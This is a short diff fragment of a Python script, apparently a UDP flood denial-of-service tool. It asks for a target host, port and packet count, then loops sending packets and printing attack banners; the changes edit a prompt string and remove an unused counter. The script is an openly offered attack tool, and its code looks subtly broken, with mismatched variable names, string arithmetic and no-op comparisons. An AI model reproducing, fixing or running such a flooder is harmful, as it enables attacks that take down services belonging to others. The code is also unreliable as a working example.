@@ -41,7 +41,7 @@ print()
 ip = input("[+] Enter the targets host : ")
 Port = input("[+] Enter the targets port : ")
 sent = input("[+] Enter the targets packet 1-20000000 : ")
-bytes = input("[+] Enter the random tools : ")
+bytes = input("[+] Enter the bytes tools : ")
 os.system("clear")
 print("Waiting 5 second DDOS")
 time.sleep(5)
@@ -55,8 +55,6 @@ while True:
         white.sendto(bytes, (ip, port))
         sent = sent + 1
         sent==15000000
-        random = random + 1
-        random==15000000
         print("\033[1;91mHas Been Attack ====> \033[1;32m%s \033[1;91m Has Been Sent Packet to =====> \033[1;32m%s \033[1;91mHas Been Attack Port =====> \033[1;32m%s " % (sent, ip, port))
 
 print("\033[1;92mAttack finished\033[0m")
